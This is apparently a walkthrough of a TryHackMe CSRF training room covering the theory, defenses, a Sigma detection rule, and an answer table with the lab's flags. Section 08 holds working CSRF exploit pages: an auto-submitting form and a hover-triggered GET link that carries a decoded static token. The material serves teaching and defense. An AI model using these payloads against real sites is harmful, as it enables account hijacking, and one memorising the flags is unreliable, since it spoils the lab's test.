# Comprehensive Technical Room Guide: CSRF Introduction

---

## Section 01: Room Overview & Metadata

| Metadata Field | Technical Specification |
| :--- | :--- |
| **Room Title** | CSRF Introduction (Cross-Site Request Forgery) |
| **Learning Path** | Jr Penetration Tester (PT1 Aligned Curriculum) |
| **Module** | Web Application Vulnerabilities I (Module 07) |
| **Room Slug** | `csrfintroduction` (Historical URL: `/room/csrf`) |
| **Difficulty Level** | Easy |
| **Room Type** | Walkthrough & Practical Laboratory |
| **Estimated Completion Time** | 60 Minutes |
| **Total Tasks** | 8 Interactive Tasks |
| **Target Application** | StaffHub Internal Employee Portal (`http://staffhub.thm:8080`) |
| **User Completion Status** | 100% Completed (Verified live on TryHackMe platform) |

---

## Section 02: Educational & Operational Objectives

1. **Grasp the Confused Deputy Paradigm:** Understand how Cross-Site Request Forgery (CSRF) abuses the browser's automatic inclusion of ambient credentials (session cookies) to execute unintended actions against a trusted server.
2. **Deconstruct the Three Invariant Conditions:** Identify the essential prerequisites of CSRF: a state-changing server action, cookie-based session handling, and the complete absence of unpredictable request tokens.
3. **Dispel Common Developer Fallacies:** Prove empirically that enforcing HTTP `POST` does not mitigate CSRF, as HTML forms easily transmit cross-origin POST requests without CORS preflights.
4. **Develop Zero-Interaction Exploit Pages:** Construct and host autonomous HTML exploit pages utilizing JavaScript DOM automation (`form.submit()`) to execute state changes seamlessly.
5. **Exploit Flawed Token Implementations:** Reverse-engineer predictable and static tokens generated via reversible encodings (such as Base64) and leverage state-changing `GET` requests.
6. **Implement Multi-Layered Defenses:** Apply the Synchronizer Token Pattern (STP), enforce RFC 6265bis `SameSite` cookie flags, and configure step-up re-authentication for critical user actions.

---

## Section 03: Target Architecture & Network Topology

```
+─────────────────────────────────────────────────────────────────────────────────────────+
|                                    NETWORK TOPOLOGY DIAGRAM                             |
|                                                                                         |
|                 +───────────────────────────────────────────────────+                   |
|                 |                   Victim User                     |                   |
|                 |          (Authenticated Employee Browser)         |                   |
|                 +───────────────────────────────────────────────────+                   |
|                                     │           ▲                                       |
|        1. Genuine Session / Cookies │           │ 3. Social Engineering Visit           |
|                                     ▼           │    (Loads Exploit Page)               |
|  +─────────────────────────────────────+     +───────────────────────────────────────+  |
|  |     Target Application Server       |     |         Attacker Infrastructure       |  |
|  |             (StaffHub)              |     |          (AttackBox / Evil Web)       |  |
|  |─────────────────────────────────────|     |───────────────────────────────────────|  |
|  | IP: 10.10.X.Y (staffhub.thm:8080)   |     | IP: 10.10.A.B (Port 81)               |  |
|  | Web Stack: Apache / PHP 7.4         |     | Web Stack: Python / Apache2           |  |
|  | Cookie: PHPSESSID (No SameSite)     |     | Hosted: settings.html & role.html     |  |
|  | Endpoints:                          |     |                                       |  |
|  |  - /update_email.php (POST)         |     |                                       |  |
|  |  - /update_role.php (GET, Weak)     |     |                                       |  |
|  +─────────────────────────────────────+     +───────────────────────────────────────+  |
|                                     ▲                                                   |
|                                     │ 4. Forged Cross-Site Request                      |
|                                     │    (Carries Victim's PHPSESSID!)                  |
|                                     └───────────────────────────────────────────────────┘
+─────────────────────────────────────────────────────────────────────────────────────────+
```

---

## Section 04: Prerequisites, Tooling & Environment Setup

### 1. Conceptual Knowledge:
- Working knowledge of HTTP request/response flows (Headers, Methods, Cookies).
- Familiarity with the Same-Origin Policy (SOP) and cross-origin resource sharing limitations.
- Basic understanding of HTML forms, DOM element access, and client-side JavaScript.

### 2. Networking and Host Resolution:
Ensure the target hostname `staffhub.thm` resolves to your target machine's IP address:
```bash
# Append host entry to local /etc/hosts
echo "10.10.X.Y staffhub.thm" | sudo tee -a /etc/hosts

# Probe target application HTTP port 8080
curl -I -s http://staffhub.thm:8080/login.php | head -n 5
```

---

## Section 05: Theoretical Deep Dive

### 1. The Core Nature of CSRF:
CSRF (also known as "one-click attack" or "session riding") occurs when an attacker tricks an authenticated browser into submitting unauthorized HTTP requests to an application that implicitly trusts the user's session credentials.

### 2. Ambient Authority & The Confused Deputy:
Web browsers maintain an "ambient authority" security model. When a cookie is stored for `staffhub.thm`, the browser does not evaluate *who* instructed the transmission of the HTTP request. Whether initiated by a legitimate button click on `staffhub.thm` or an image tag on `evil.thm`, the browser attaches the cookie automatically.

### 3. The Three Required Invariants:
1. **A Relevant (State-Changing) Action:** Modifying an email, resetting a password, or altering user privileges. Pure read actions cannot be exploited via CSRF because the browser's Same-Origin Policy forbids `evil.thm` from reading the response returned by `staffhub.thm`.
2. **Cookie-Based Session Handling:** The application relies exclusively on cookies (or HTTP Basic Auth) to validate user identity without secondary challenges (re-authenticating existing passwords or 2FA).
3. **Absence of Unpredictable Parameters:** The request syntax contains no secret, unpredictable parameters that an external attacker cannot guess or forge.

---

## Section 06: Reconnaissance & Attack Surface Mapping

Upon logging into StaffHub (`http://staffhub.thm:8080`) using default employee credentials (`user` / `user`), we evaluate the administrative forms available under `settings.php`:

### 1. The Email Update Form:
```html
<form action="update_email.php" method="POST">
    <div class="input-field">
        <input id="email" type="email" name="email" required>
        <label for="email">New Email Address</label>
    </div>
    <button type="submit">Update Email</button>
</form>
```
- **Vulnerability Indicators:**
  - Method is `POST`.
  - No hidden anti-CSRF token exists.
  - The session cookie `PHPSESSID` contains no `SameSite` attribute.

### 2. The Role Update Form:
```html
<form action="update_role.php" method="GET">
    <input type="hidden" name="csrf_token" value="YWRtaW4=">
    <input type="hidden" name="role" value="staff">
    <button type="submit">Update Role</button>
</form>
```
- **Vulnerability Indicators:**
  - Uses HTTP `GET` for an administrative state change.
  - Uses a static, hardcoded, or easily predictable token `YWRtaW4=`.

---

## Section 07: Vulnerability Analysis & Root Cause

### 1. `update_email.php` Root Cause:
The server-side PHP script relies purely on session validation and POST variable processing:
```php
<?php
session_start();
if (!isset($_SESSION['user_id'])) { die("Unauthorized"); }
$new_email = $_POST['email'];
update_user_email($_SESSION['user_id'], $new_email);
?>
```
The server fails to enforce the Synchronizer Token Pattern (STP) and does not verify the `Origin` or `Referer` headers.

### 2. `update_role.php` Root Cause:
The developer attempted to implement an anti-CSRF token, but committed two fatal errors:
1. Reversible encoding: `YWRtaW4=` is merely the Base64 representation of `admin`:
   ```bash
   echo -n "YWRtaW4=" | base64 -d  # Output: admin
   ```
2. State mutation via HTTP `GET`: Enabling execution via media embedding or trivial JavaScript URL navigation without requiring form construction.

---

## Section 08: Step-by-Step Exploitation & Flag Capture

### Scenario 1: HTML Form Exploitation (Task 05)

1. Construct an exploit document on the attacker server (`/var/www/html/settings.html`):
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Employee Survey</title>
</head>
<body>
    <h2>Loading Survey Data... Please Wait.</h2>
    <form id="csrfForm" action="http://staffhub.thm:8080/update_email.php" method="POST">
        <input type="hidden" name="email" value="attacker@evilmail.thm" />
    </form>
    <script>
        document.getElementById('csrfForm').submit();
        setTimeout(function() {
            window.location.href = "http://staffhub.thm:8080/settings.php";
        }, 1000);
    </script>
</body>
</html>
```
2. Host the payload on the AttackBox web server on port 81:
   ```bash
   sudo systemctl restart apache2
   ```
3. Open the link `http://10.10.A.B:81/settings.html` within the victim's authenticated browser session.
4. The browser automatically dispatches the POST request with the victim's session cookie and redirects back to `settings.php`. The application outputs Flag 1:
   > **Flag 1:** `THM{Got_The_Evil_Email001}`

5. Modify the target email to `special@evilmail.thm`:
   ```bash
   sed -i 's/attacker@evilmail.thm/special@evilmail.thm/g' /var/www/html/settings.html
   ```
6. Re-execute the exploit in the victim's browser to harvest Flag 2:
   > **Flag 2:** `THM{My_Special_Email007}`

---

### Scenario 2: Weak Token Reversal & GET CSRF (Task 06)

1. Decode the weak token:
   ```bash
   echo -n "YWRtaW4=" | base64 -d  # Output: admin
   ```
2. Because the endpoint processes state changes over `GET`, assemble the malicious payload:
   ```
   http://staffhub.thm:8080/update_role.php?role=staff&csrf_token=YWRtaW4=
   ```
3. Host an event-driven social engineering page (`/var/www/html/role.html`):
```html
<!DOCTYPE html>
<html>
<head>
    <title>Corporate Policy Update</title>
</head>
<body>
    <h2>StaffHub Corporate Policy Notice</h2>
    <p>Please hover over the banner below to acknowledge policy review:</p>
    <img src="http://staffhub.thm:8080/one.png"
         width="400"
         onmouseover="window.location='http://staffhub.thm:8080/update_role.php?role=staff&csrf_token=YWRtaW4='">
</body>
</html>
```
4. When the authenticated admin hovers over the banner, the browser executes the URL navigation and demotes the account to `staff`.
5. Navigate to `http://staffhub.thm:8080/dashboard.php` to capture Flag 3:
   > **Flag 3:** `THM{Weak_CSRF_Role_001}`

---

## Section 09: Defense-in-Depth & Hardening Strategies

A resilient defense architecture requires three synchronized layers:

```
+─────────────────────────────────────────────────────────────────────────────────────────+
|                           DEFENSE-IN-DEPTH REMEDIATION MODEL                            |
|                                                                                         |
|  [ Layer 1: Synchronizer Token Pattern (STP) ]                                          |
|  - Generate CSPRNG tokens with at least 128 bits of entropy.                            |
|  - Bind tokens to server sessions and validate using constant-time comparisons.         |
|                                                                                         |
|  [ Layer 2: Modern Cookie Directives (SameSite) ]                                       |
|  - Enforce `SameSite=Strict` for sensitive banking and administrative portals.          |
|  - Apply `SameSite=Lax` as the minimum baseline for standard web applications.         |
|  - Combine with `Secure` and `HttpOnly` attributes.                                     |
|                                                                                         |
|  [ Layer 3: Interactive Re-Authentication & Step-Up Controls ]                           |
|  - Demand existing password verification prior to email, password, or role changes.     |
|  - Mandate out-of-band multi-factor authentication (OTP/FIDO2) for sensitive operations. |
+─────────────────────────────────────────────────────────────────────────────────────────+
```

---

## Section 10: Detection, Threat Hunting & SIEM Rules

### 1. Web Access Log Auditing:
Inspect Apache/Nginx access logs for cross-origin state changes:
```bash
# Filter for POST requests to sensitive endpoints where Referer does not match internal domain:
awk '$6 ~ /POST/ && $7 ~ /update_email.php/ && $11 !~ /staffhub\.thm/ {print $1, $4, $7, $11}' /var/log/apache2/access.log
```

### 2. Sigma Detection Rule:
```yaml
title: Anomalous Cross-Origin State-Changing Request (Potential CSRF)
id: 5b4d7e89-6a1f-4b9c-8e32-11a2f4c78d90
status: stable
description: Identifies HTTP POST requests targeting sensitive endpoints originating from untrusted Referers.
logsource:
  category: webserver
detection:
  selection:
    cs-method: 'POST'
    cs-uri-stem:
      - '/update_email.php'
      - '/update_role.php'
      - '/reset_password.php'
  filter_internal:
    cs-referer|contains: 'staffhub.thm'
  condition: selection and not filter_internal
fields:
  - c-ip
  - cs-method
  - cs-uri-stem
  - cs-referer
falsepositives:
  - Legitimate corporate redirects or SSO callback routines.
level: high
```

---

## Section 11: Common Pitfalls & Troubleshooting

1. **Assuming POST Methods Are Safe:**
   - *Pitfall:* Believing cross-site forms cannot dispatch POST requests.
   - *Reality:* Standard HTML forms execute cross-origin POSTs freely without triggering CORS preflights.
2. **Utilizing Deterministic or Decodable Tokens:**
   - *Pitfall:* Generating tokens from user roles, IDs, or timestamps via Base64 or MD5.
   - *Reality:* Attackers easily predict or calculate these values. Tokens must originate from a CSPRNG.
3. **Allowing State Mutation via GET:**
   - *Pitfall:* Processing updates via `GET /update_role.php?role=staff`.
   - *Reality:* Violates RFC 7231 and permits zero-click CSRF via inline tags like `<img src="...">`.

---

## Section 12: Real-World Case Studies & CVE Mapping

1. **Netgear / Residential Router DNS Hijacking (CVE-2008-2398):**
   - Embedded image tags on external forums forced logged-in router administrators to silently overwrite their DNS settings, rerouting network traffic to malicious nameservers.
2. **GlassFish Application Server Administration Takeover (CVE-2011-0807):**
   - Missing anti-CSRF tokens in administrative consoles allowed remote threat actors to deploy arbitrary malicious WAR packages.
3. **Standard Classifications:**
   - **CWE-352:** Cross-Site Request Forgery (CSRF).
   - **OWASP Top 10:2021:** A01:2021 - Broken Access Control.

---

## Section 13: Summary & Answers Matrix

| Task Number | Focus Concept | Platform Question | Final Accepted Answer |
| :--- | :--- | :--- | :--- |
| **Task 01** | Lab Initialization | I have successfully connected to the machine. | `No answer needed` |
| **Task 02** | Core Mechanics | What relationship between the browser and web app does CSRF abuse? | `Trust` |
| | Ambient Credentials | What does the browser automatically include with requests after login? | `Cookies` |
| **Task 03** | Preconditions | What type of action is usually required for a CSRF attack to succeed? | `State-changing` |
| **Task 04** | Vulnerability Auditing | What HTTP request method do many developers incorrectly believe prevents CSRF? | `POST` |
| | Core Defense | What mechanism is commonly used to protect applications from CSRF attacks? | `CSRF tokens` |
| **Task 05** | HTML Form Exploit | What is the flag value after updating email to attacker@evilmail.thm? | `THM{Got_The_Evil_Email001}` |
| | Exploit Modification | What is the flag value after updating email to special@evilmail.thm? | `THM{My_Special_Email007}` |
| **Task 06** | Weak Token Reversal | What is the flag value after demoting user from admin to staff? | `THM{Weak_CSRF_Role_001}` |
| | Token Reversal | What is the name of the encoding scheme used by developer? | `base64` |
| **Task 07** | Best Practices | I have understood the best practices. | `No answer needed` |
| **Task 08** | Conclusion | I have successfully completed the room. | `No answer needed` |

---

## Section 14: Practical Exercises & Challenge Extensions

1. **Exercise 1: CSRF Scanner Script:**
   - Develop a Python script using `BeautifulSoup` to crawl a web application, parse all `<form>` elements, and flag any state-changing form lacking a hidden CSRF token input.
2. **Exercise 2: Burp Suite Pro PoC Generation:**
   - Intercept a state-changing POST request in Burp Suite, navigate to `Engagement tools -> Generate CSRF PoC`, configure auto-submit JavaScript, and test it against a sandboxed browser session.
3. **Exercise 3: XSS-Assisted CSRF Token Exfiltration:**
   - Construct a simulated lab where an application uses strict CSRF tokens but suffers from Stored XSS. Write a JavaScript payload that fetches the token from the DOM via `fetch('/settings.php')` and issues an authenticated POST request with the stolen token.
